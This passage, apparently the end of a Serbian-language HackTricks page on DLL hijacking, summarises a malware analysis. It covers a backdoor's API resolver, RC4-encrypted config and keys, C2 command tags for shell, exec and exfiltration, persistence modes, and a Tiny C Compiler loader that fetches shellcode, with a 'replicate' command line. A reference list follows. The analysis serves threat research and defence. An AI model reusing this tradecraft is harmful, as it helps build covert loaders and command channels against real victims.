- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaki export table u 4-byte blokovima sa Murmur-style mixing, i samo pada na `GetProcAddress` ako hash nije pronađen.

Embedded configuration & C2
- Konfiguracija se nalazi unutar drop-ovanog `BluetoothService` fajla na **offset 0x30808** (veličina **0x980**) i RC4-dekriptovana je sa ključem `qwhvb^435h&*7`, otkrivajući C2 URL i User-Agent.
- Beaconi grade dot-delimited host profil, prepend-uju tag `4Q`, zatim RC4-enkriptuju sa ključem `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS. Odgovori su RC4-dekriptovani i dispatch-ovani po tag switch-u (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer slučajevi).
- Execution mode je kontrolisan CLI argumentima: bez argumenata = install persistence (service/Run key) koji pokazuje na `-i`; `-i` relaunch-uje self sa `-k`; `-k` preskače install i izvršava payload.

Alternate loader observed
- Ista intrusion je drop-ovala Tiny C Compiler i izvršila `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. Napadač-supplied C source je ugravirao shellcode, kompajlirao ga i pokrenuo in-memory bez diranja diska sa PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova TCC-based compile-and-run faza pri pokretanju je uvezla `Wininet.dll` i povukla second-stage shellcode sa hardkodirane URL adrese, dajući fleksibilan loader koji se prikriva kao compiler run.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
